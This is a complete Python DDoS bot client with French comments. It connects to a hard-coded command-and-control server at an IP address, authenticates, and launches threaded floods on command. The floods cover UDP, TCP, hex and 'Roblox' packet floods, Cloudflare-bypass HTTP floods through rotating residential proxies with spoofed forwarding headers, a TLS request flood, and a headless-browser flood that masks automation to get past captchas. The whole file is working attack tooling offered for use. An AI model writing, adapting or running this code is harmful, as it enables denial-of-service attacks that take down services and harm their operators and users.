#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import random
import cloudscraper
import string
import ssl
import requests

C2_ADDRESS = "77.83.242.177"
C2_PORT = 6669

base_user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
]

def rand_ua():
    return random.choice(base_user_agents)

def rand_string(length=16):
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

# ────────────────────────────────────────────────
# Chargement proxies pour CFB (gate.decodo.com:port:user:pass + classiques)
# ────────────────────────────────────────────────
def load_proxies():
    proxies_list = []
    try:
        with open('proxies.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue

                # Format gate résidentiel
                if line.count(':') == 3:
                    try:
                        host, port, user, password = line.split(':')
                        proxy_url = f"http://{user}:{password}@{host}:{port}"
                        proxies_list.append(proxy_url)
                        continue
                    except:
                        pass

                # URL complète
                if line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                    proxies_list.append(line)
                # ip:port ou user:pass@ip:port
                elif ':' in line:
                    if '@' in line:
                        proxies_list.append(f"http://{line}")
                    else:
                        proxies_list.append(f"http://{line}")

        if proxies_list:
            print(f"[PROXIES] {len(proxies_list)} proxies chargés")
        else:
            print("[PROXIES] Aucun proxy valide")
    except FileNotFoundError:
        print("[PROXIES] proxies.txt introuvable → sans proxy")
    except Exception as e:
        print(f"[PROXIES] Erreur : {e}")
    return proxies_list

# ────────────────────────────────────────────────
# Attaques UDP / TCP / etc.
# ────────────────────────────────────────────────
def attack_udp(ip, port, secs, size):
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            s.sendto(random._urandom(size), (ip, dport))
        except:
            pass

def attack_tcp(ip, port, secs, size):
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while time.time() < end_time:
                s.send(random._urandom(size))
        except:
            pass
        finally:
            try:
                s.close()
            except:
                pass

def attack_gudp(ip, port, secs, size):
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            s.sendto(random._urandom(size), (ip, dport))
        except:
            pass

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(6):
                s.sendto(payload, (ip, port))
        except:
            pass

def attack_roblox(ip, port, secs, size):
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(size)
            dport = random.randint(1, 65535) if port == 0 else port
            for _ in range(1500):
                ran = random.randrange(10 ** 80)
                hex_str = "%064x" % ran
                hex_str = hex_str[:64]
                s.sendto(bytes.fromhex(hex_str) + bytes_data, (ip, dport))
        except:
            pass

def attack_junk(ip, port, secs):
    payload = b'\x00' * 64
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(3):
                s.sendto(payload, (ip, port))
        except:
            pass

def UDPPPS_attack(ip, port, secs):
    payload = b'\x00'
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(100):
                s.sendto(payload, (ip, port))
        except:
            pass

# ────────────────────────────────────────────────
# CFB – support proxies résidentiels gate.decodo.com:port:user:pass
# ────────────────────────────────────────────────
def CFB_attack(url, secs):
    end_time = time.time() + int(secs)

    proxies_list = load_proxies()
    proxy = random.choice(proxies_list) if proxies_list else None
    proxies_dict = {"http": proxy, "https": proxy} if proxy else None

    print(f"[CFB] Proxy thread : {proxy or 'direct'}")

    try:
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False},
            delay=0,
            debug=False,
            disableCloudflareV1=True,
            allow_brotli=True,
            interpreter='js2py',
        )
    except Exception as e:
        print(f"[CFB] Erreur scraper : {e}")
        return

    cookies_str = ''
    user_agent = rand_ua()
    try:
        resp = scraper.get(url, timeout=8, proxies=proxies_dict)
        if resp.status_code < 400:
            cookies_str = '; '.join(f"{k}={v}" for k, v in resp.cookies.get_dict().items())
            user_agent = resp.request.headers.get('User-Agent', user_agent)
    except:
        pass

    req_count = 0
    window_start = time.time()

    while time.time() < end_time:
        fake_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        fake_ref = f"https://www.google.com/search?q={rand_string(6)}"

        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Referer': fake_ref,
            'X-Forwarded-For': fake_ip,
            'Cache-Control': 'no-cache',
        }
        if cookies_str:
            headers['Cookie'] = cookies_str

        try:
            scraper.get(
                url,
                headers=headers,
                proxies=proxies_dict,
                timeout=(2.0, 4.0),
                allow_redirects=False,
                stream=True,
            )
            req_count += 1
        except:
            pass

        elapsed = time.time() - window_start
        if elapsed >= 1.5:
            rate = req_count / elapsed if elapsed > 0 else 0
            print(f"[CFB] {req_count} req | {rate:.0f} req/s (proxy: {proxy or 'direct'})")
            req_count = 0
            window_start = time.time()

    print("[CFB] Thread terminé")

# ────────────────────────────────────────────────
# TLS DIRECT – corrigé
# ────────────────────────────────────────────────
def tls_socket_flood_direct(target, secs, requests_per_connection=150):
    end_time = time.time() + int(secs)

    host = target.split("://")[1].split("/")[0].split(":")[0] if "://" in target else target.split("/")[0].split(":")[0]
    path = "/" if "/" not in target else target.split(host, 1)[1] or "/"

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers(
        "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:"
        "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
        "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
    )

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            tls_sock = context.wrap_socket(s, server_hostname=host)
            tls_sock.connect((host, 443))

            req_base = (
                f"GET {path} HTTP/1.3\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {rand_ua()}\r\n"
                f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                f"Referer: {target}\r\n"
                f"Connection: Keep-Alive\r\n\r\n"
            ).encode()

            for _ in range(requests_per_connection):
                if time.time() >= end_time:
                    break
                try:
                    tls_sock.send(req_base)
                    tls_sock.recv(512)
                except:
                    break

            tls_sock.close()
        except:
            time.sleep(0.3)

    print("[TLS] Flood terminé")

# ────────────────────────────────────────────────
# HTTP_REQ – corrigé
# ────────────────────────────────────────────────
def REQ_attack(url, secs, port=None):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    if port and str(port) not in ['80', '443']:
        parsed = url.split('://', 1)
        protocol = parsed[0]
        rest = parsed[1]
        host_port = rest.split('/', 1)[0]
        path = '/' + rest.split('/', 1)[1] if '/' in rest else ''
        if ':' in host_port:
            host_port = host_port.split(':', 1)[0] + f":{port}"
        else:
            host_port += f":{port}"
        url = f"{protocol}://{host_port}{path}"

    end_time = time.time() + int(secs)

    session = requests.Session()
    session.headers.update({'User-Agent': rand_ua()})

    while time.time() < end_time:
        try:
            if random.random() > 0.5:
                session.get(url, timeout=3)
            else:
                session.head(url, timeout=3)
        except:
            pass

    session.close()
    print("[HTTP_REQ] Terminé")

# ────────────────────────────────────────────────
# HTTP_CAPTCHA – corrigé
# ────────────────────────────────────────────────
def http_captcha_attack(url, secs):
    end_time = time.time() + int(secs)

    with sync_playwright() as p:
        while time.time() < end_time:
            browser = None
            try:
                browser = p.firefox.launch(headless=True, timeout=30000)
                page = browser.new_page(user_agent=rand_ua())
                page.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', { get: () => false });
                    Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
                """)
                page.goto(url, timeout=45000, wait_until="domcontentloaded")
                captcha_selector = '#h-captcha, #cf-hcaptcha-container, #recaptcha, [data-sitekey]'
                if page.query_selector(captcha_selector):
                    print("[CAPTCHA] Captcha détecté → attente 15s")
                    page.wait_for_timeout(15000)
                else:
                    page.wait_for_timeout(random.randint(2000, 5000))
            except Exception as e:
                print(f"[CAPTCHA] Erreur : {e.__class__.__name__}")
                time.sleep(5)
            finally:
                if browser:
                    try:
                        browser.close()
                    except:
                        pass

    print("[CAPTCHA] Terminé")

# ────────────────────────────────────────────────
# Main – C2
# ────────────────────────────────────────────────
def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    while True:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))
            while True:
                c2.send('669787761736865726500'.encode())
                break
            while True:
                time.sleep(1)
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break
            while True:
                time.sleep(1)
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            break
        except:
            time.sleep(5)

    while True:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break
            args = data.split(' ')
            command = args[0].upper()

            if command == '!UDP':
                ip, port, secs, size, threads = args[1], int(args[2]), int(args[3]), int(args[4]), int(args[5])
                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()

            elif command == '!TCP':
                ip, port, secs, size, threads = args[1], int(args[2]), int(args[3]), int(args[4]), int(args[5])
                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

            elif command == '!GUDP':
                ip, port, secs, size, threads = args[1], int(args[2]), int(args[3]), int(args[4]), int(args[5])
                for _ in range(threads):
                    threading.Thread(target=attack_gudp, args=(ip, port, secs, size), daemon=True).start()

            elif command == '!HEX':
                ip, port, secs, threads = args[1], int(args[2]), int(args[3]), int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()

            elif command == '!ROBLOX':
                ip, port, secs, size, threads = args[1], int(args[2]), int(args[3]), int(args[4]), int(args[5])
                for _ in range(threads):
                    threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()

            elif command == '!JUNK':
                ip, port, secs, threads = args[1], int(args[2]), int(args[3]), int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()

            elif command == '!UDPPPS':
                ip, port, secs, threads = args[1], int(args[2]), int(args[3]), int(args[4])
                for _ in range(threads):
                    threading.Thread(target=UDPPPS_attack, args=(ip, port, secs), daemon=True).start()

            elif command == '!HTTP_CFB':
                url = args[1]
                secs = int(args[2])
                threads_count = int(args[3]) if len(args) > 3 else 64
                print(f"Lancement {threads_count} threads CFB sur {url} ({secs}s)")
                for _ in range(threads_count):
                    threading.Thread(target=CFB_attack, args=(url, secs), daemon=True).start()

            elif command == '!HTTP_TLS':
                url = args[1]
                secs = int(args[2])
                requests_per_conn = int(args[3]) if len(args) > 3 else 120
                threads = int(args[4]) if len(args) > 4 else 25
                for _ in range(threads):
                    threading.Thread(target=tls_socket_flood_direct, args=(url, secs, requests_per_conn), daemon=True).start()

            elif command == '!HTTP_REQ':
                url = args[1]
                port = int(args[2]) if len(args) > 2 else None
                secs = int(args[3])
                threads = int(args[4]) if len(args) > 4 else 20
                for _ in range(threads):
                    threading.Thread(target=REQ_attack, args=(url, secs, port), daemon=True).start()

            elif command == '!HTTP_CAPTCHA':
                url = args[1]
                secs = int(args[2])
                threads = int(args[3]) if len(args) > 3 else 3
                for _ in range(threads):
                    threading.Thread(target=http_captcha_attack, args=(url, secs), daemon=True).start()

            elif command == 'PING':
                c2.send('PONG'.encode())

        except Exception as e:
            print(f"[C2] Erreur : {e}")
            break

    c2.close()
    main()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("[MAIN] Arrêt par utilisateur")
    except Exception as e:
        print(f"[MAIN] Erreur fatale : {e}")
